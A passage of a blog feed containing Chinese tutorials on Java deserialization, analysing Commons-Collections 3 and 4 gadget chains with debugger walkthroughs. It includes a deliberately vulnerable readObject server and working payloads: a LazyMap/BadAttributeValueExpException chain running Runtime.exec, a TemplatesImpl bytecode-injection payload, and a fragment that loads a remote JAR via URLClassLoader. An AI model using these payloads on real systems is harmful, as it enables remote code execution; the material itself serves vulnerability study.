class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;URL[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[]&#123;new URL[]&#123;new URL("http://127.0.0.1:8090/summer.jar")&#125;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"loadClass"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"summer"&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getConstructor"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;String.class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new String[]&#123;"ipconfig"&#125;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 笔者这里总结都是以CC链为改造基础，其实CC还有很多玩法，大家可以脑洞一下，Java反序列化回显也不止本文中两种，比例说RMI、weblogic的T3协议。学习无止境，努力就完事。</p><p><code>于无常处知有情，于有情处知众生..........</code></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://javasec.org/javase/ClassLoader/" target="_blank" rel="noopener">https://javasec.org/javase/ClassLoader/</a><br><a href="https://xz.aliyun.com/t/7740" target="_blank" rel="noopener">https://xz.aliyun.com/t/7740</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;题外话&quot;&gt;&lt;a href=&quot;#题外话&quot; class=&quot;headerlink&quot; title=&quot;题外话&quot;&gt;&lt;/a&gt;题外话&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 这是一篇本应该早就完成的文章，但是由于各种原因拖延至此。之前有读者就催我，但是实在是各种事情缠身，加上自己
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java 反序列化" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>漫谈Commons-Collections反序列化</title>
    <link href="https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-26T13:27:45.000Z</published>
    <updated>2020-05-20T08:19:17.580Z</updated>
    
    <content type="html"><![CDATA[<p>﻿# 前言</p><p>&emsp;&emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过<code>ysoserial--Gadget--URLDNS</code>，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者没说。<br>&emsp;&emsp; Java的第一个反序列化漏洞就是从<code>commons-collections</code>组件中发现的，从此打开了Java安全的新蓝图。<br>官方对<code>commons-collections</code>组件的说明：<code>The Java Collections Framework was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</code><br>翻译一下大概意思就是：<code>Java commons-collections 框架是JDK 1.2之后中的一个重要补充。增加了许多强大的数据结构，加快了Java应用程序的开发。已经成为Java中公认的集合处理标准。</code><br>&emsp;&emsp; 目前<code>commons-collections</code>的反序列化漏洞主要以3和4(版本)为主流，3和4的利用方式也不同，Gadget链也不相同。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons-Collections3"></a>Commons-Collections3</h1><p>&emsp;&emsp; 先看一下Gadget链，入口是上篇文章提及的。这里的3是指版本号，笔者这里只分析网上流传的某一条利用链。<code>BadAttributeValueExpException.readObject()</code>类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 试想一下先存在一个服务器，它正好存在使用<code>commons-collections</code>组件，没有做任何的修复，存在漏洞。此时你是不是就能利用此漏洞呢？</p><hr><h2 id="模拟场景DEMO"><a href="#模拟场景DEMO" class="headerlink" title="模拟场景DEMO"></a><strong>模拟场景DEMO</strong></h2><h3 id="创建模拟服务器应用"><a href="#创建模拟服务器应用" class="headerlink" title="创建模拟服务器应用"></a>创建模拟服务器应用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 模拟服务器端，接受反序列化数据</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">            System.out.println(<span class="string">"服务器监听地址： "</span> + serverSocket.getLocalSocketAddress());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="comment">// 接受反序列化数据</span></span><br><span class="line"></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"与地址： "</span> + socket.getInetAddress() + <span class="string">"连接！"</span> );</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 读取数据</span></span><br><span class="line">                    Object ob = ois.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"读取数据完成！"</span>);</span><br><span class="line">                    System.out.println(ob);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"读取数据失败！"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//目的服务器地址</span></span><br><span class="line">        String tas = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="comment">// 端口</span></span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"66666!"</span>)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建漏洞map Object</span></span><br><span class="line">        Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建异常，在反序列化时触发payload</span></span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(expException, entry);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送payload</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(tas,port);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">        oos.writeObject(expException);</span><br><span class="line">        oos.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞效果"><a href="#漏洞效果" class="headerlink" title="漏洞效果"></a>漏洞效果</h3><p>首先得让模拟服务器在运行，然后发送payload即可。<br><img src="https://img-blog.csdnimg.cn/20200517150503233.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517150434644.gif" alt="在这里插入图片描述"></p><hr><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>&emsp;&emsp; 分析必定要先断点，这里笔者将代码修改了，便于分析。这里就不再贴出，需要的可以去<a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/cc5.java" target="_blank" rel="noopener">GitHub</a>上自取，断点直接设置在<code>readObject</code>方法。<br><code>温馨提示</code>：如果你用的是Idea工具，在Debug之前请查看自己Debugger设置，请和我一样设置。为什么要这么做可以参考：<a href="https://samny.blog.csdn.net/article/details/105937958" target="_blank" rel="noopener">Skipped breakpoint because it happened inside debugger evaluation</a> ，否则你可能出现很多bug。<br><img src="https://img-blog.csdnimg.cn/20200517155502933.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517151930246.png" alt="在这里插入图片描述"></p><hr><h4 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h4><ol><li>一直跟进，到<code>BadAttributeValueException.java</code>的<code>readObject</code>方法。</li></ol><p><img src="https://img-blog.csdnimg.cn/20200517163343981.png" alt="在这里插入图片描述"><br>2. toString方法会跳转到<code>TiedMapEntry</code>的toString方法<br><img src="https://img-blog.csdnimg.cn/20200517163803421.png" alt="在这里插入图片描述"><br>3. 跟进getValue()方法<br><img src="https://img-blog.csdnimg.cn/20200517165203612.png" alt="在这里插入图片描述"><br>4. 跟进到get()方法，在get方法中，会判断<code>key</code>是否存在。然后跳转到<code>transform(key)</code>，这里的key是随便填写的，主要是transform方法是被修改过的，里面有恶意payload。<br><img src="https://img-blog.csdnimg.cn/20200517165322855.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200517165354634.png" alt="在这里插入图片描述"><br>5. 这里是用Java的反射机制，建议去了解一下。推荐博文<a href="https://blog.csdn.net/sun1318578251/category_9977685.html" target="_blank" rel="noopener">从安全角度谈Java反射机制</a><br><img src="https://img-blog.csdnimg.cn/20200517173626405.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517164317458.png" alt="在这里插入图片描述"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLXN0YXRpYy5jbmJsb2dzLmNvbS9maWxlcy9zYW1ueS9zZXJpYWxpemFibGUzLmdpZg" alt="https://blog-static.cnblogs.com/files/samny/serializable3.gif"><br>&emsp;&emsp; 看完整个完整的过程，每一步都对应着文章开头的Gadget chain。创建异常类<code>BadAttributeValueExpException</code>，以便于在反序列化时触发payload。<br><img src="https://img-blog.csdnimg.cn/2020051814514391.png" alt="在这里插入图片描述"></p><hr><h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>&emsp;&emsp; 过程看完了，但是我们还是无法理解为什么可以这么构造，还是得一步步看POC源码。我们一一对着官方文档分析函数方法的具体作用。</p><ol><li>ChainedTransformer将一个个Transformer类数组按照顺序一个个执行，前一个运行结果作为第二个transform。<br><img src="https://img-blog.csdnimg.cn/20200517173011310.png" alt="在这里插入图片描述"></li><li>ConstantTransformer调用transform方法，返回类在实例化时存储的类。<br><img src="https://img-blog.csdnimg.cn/20200517173510549.png" alt="在这里插入图片描述"></li><li>InvokerTransformer调用transform方法的时候，根据类在实例化时提供的参数，通过反射去调用对象的方法。InvokerTransformer第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(java.lang.String methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Class[] paramTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Object[] args)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517175953505.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 这是一段反射执行命令的代码，这段执行的效果完全等效于transformers[]数组，下面两张图片可以完美的诠释。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">//实例化对象</span></span><br><span class="line">          Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// 反射调用执行命令</span></span><br><span class="line">           cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517164708950.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200517175632226.png" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 创建一个HashMap，使用LazyMap.decorate()方法传入HashMap和Transformer数组。其中数组是我们构造的payload，最后使用TiedMapEntry传入一个key。其实也可以这样子<code>lazymap.get(&quot;Summer&quot;)</code>也可以传入key，这样子会在序列化过程就将key写入，而在反序列化的时候不会调用<code>LazyMap.get()</code>方法，判断key是否存在。不存在则会调用<code>this.factory.transform(key);</code>方法，进而触发反序列化漏洞。所以很显然这种方法不可取，只能通过修改底层的方式，加入key值，以便于在反序列化的时候触发漏洞，并同时确保在序列化的过程不会触发漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">      Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200518095025914.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 到目前为止，并没有触发反序列化漏洞的入口。而<code>BadAttributeValueExpException</code>这个类是javax.management报下的一个类，是jdk自带的，无需依赖第三方。它继承了Serializable接口满足反序列化漏洞的条件，它只有一个值权限是private不可修改，但利用反射机制修改其值来到达触发反序列化漏洞的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">           field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           field.set(expException, entry);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 反序列化利用点是使用<code>LazyMap</code>在获取key值的时候，使其key不存在，然后再获取key的时候触发漏洞。但需要有一个入口，这里的反序列化触发的入口是JDK自带的<code>BadAttributeValueExpException</code>类。有几个点不得不服大佬们的厉害之处，第一点是找到反序列化的入口<code>BadAttributeValueExpException</code>，这个类得满足反序列化的基本条件，还得是JDK自带或者是组件自带的。第二点是使用<code>LazyMap</code>的key为空来触发反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518105354743.png" alt="在这里插入图片描述"></p><hr><h1 id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons-Collections4"></a>Commons-Collections4</h1><p> 先看一下Gadget链，入口是JDK自带的<code>PriorityQueue.readObject()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 断点撸码，断点的位置对于新手可能有点不知道该从何下手，其实掌握一点，看入口，反序列化的入口。<code>Commons-Collections4</code>这里的入口时<code>PriorityQueue.readObject()</code>方法，这时你可以双击<code>Shift</code>，找到该类在readObject下断点。<br><img src="https://img-blog.csdnimg.cn/20200518164944907.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 去掉注释，也就省这么几行代码。自己结合官方文档分析一下就知道该断在哪里，如果你在知道具体步骤，你可以将每一行都设置个断点进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        s.readInt();</span><br><span class="line">        queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞触发流程-1"><a href="#漏洞触发流程-1" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><ol><li>从ObjectInputStream.readObject()-&gt;PriorityQueue.readObject()-&gt;heapify()方法<br><img src="https://img-blog.csdnimg.cn/2020051816535565.png" alt="在这里插入图片描述"></li><li>接着会执行heapify()-&gt;sifrDown()<br><img src="https://img-blog.csdnimg.cn/20200518165629497.png" alt="在这里插入图片描述"></li><li>sifrDown()-&gt;comparator不为空进入siftDownUsingComparator()方法<br><img src="https://img-blog.csdnimg.cn/2020051816581125.png" alt="在这里插入图片描述"></li><li>if判断是否&lt;=0是触发漏洞<br><img src="https://img-blog.csdnimg.cn/20200518165904692.png" alt="在这里插入图片描述"></li><li>compare方法会执行transformer的transform方法，而transform通过反射机制被修改过，最后会导致反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518170453617.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200519095242678.png" alt="在这里插入图片描述"></li></ol><hr><h3 id="漏洞成因分析-1"><a href="#漏洞成因分析-1" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java" target="_blank" rel="noopener">完整的实验代码地址https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java</a><br>&emsp;&emsp; Javaassist被广泛用于修改字节码的工具包，而此gadget chain中使用修改字节码的形式触发漏洞。一个 CtClass (编译时类）对象可以处理一个 class 文件，ClassPool 是 CtClass 对象的容器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认系统类搜索路径</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 添加额外的类搜索路径</span></span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Payload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">      <span class="comment">// 获取我们恶意payload的对象</span></span><br><span class="line">      <span class="keyword">final</span> CtClass clazz = pool.get(Payload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 修改好字节码后，在通过一系列的反射方法，将构造好的字节加入<code>tamplates</code>中，在反序列化的过程触发漏洞。反射这里就不过多的解释，如果不懂可以看笔者往期的博文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// 静态初始化时插入执行命令的字节码</span></span><br><span class="line">      String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">      clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// 将初始化后的类设置新的名字</span></span><br><span class="line">      clazz.setName(<span class="string">"Summer"</span> + System.nanoTime());</span><br><span class="line">      <span class="comment">// 设置父类为AbstractTranslet</span></span><br><span class="line">      CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">      clazz.setSuperclass(superC);</span><br><span class="line"><span class="comment">// 获取修改后的字节码</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 其实将第二个占位只要是Object的类型对象就可以，比例可以是<code>tpl.newInstace()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里queue要占两个位，比较方法是要两个才能比较</span></span><br><span class="line">      <span class="comment">// 两个位的都要是一个类型，这里都是Object</span></span><br><span class="line">      queue.add(templates);</span><br><span class="line">      queue.add(<span class="keyword">new</span> VerifyError(<span class="string">"Summer"</span>));</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;修改字节码之后我们再看看<code>newTransformer()</code>–&gt;<code>TemplatesImpl.getTransletInstance()</code> 方法。<br><img src="https://img-blog.csdnimg.cn/20200520141806664.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <code>getTransletInstance()</code>–&gt;<code>defineTransletClasses()</code>，这里会返回一个定义主类的类对象的引用。<br><img src="https://img-blog.csdnimg.cn/20200520142312443.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 最后在这里的强制类型转化触发漏洞，到达执行命令的效果。<br><img src="https://img-blog.csdnimg.cn/20200520142424728.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200520142558464.gif" alt="在这里插入图片描述"></p><hr><h2 id="小结-1"><a href="#小结-1" class="headerlink" 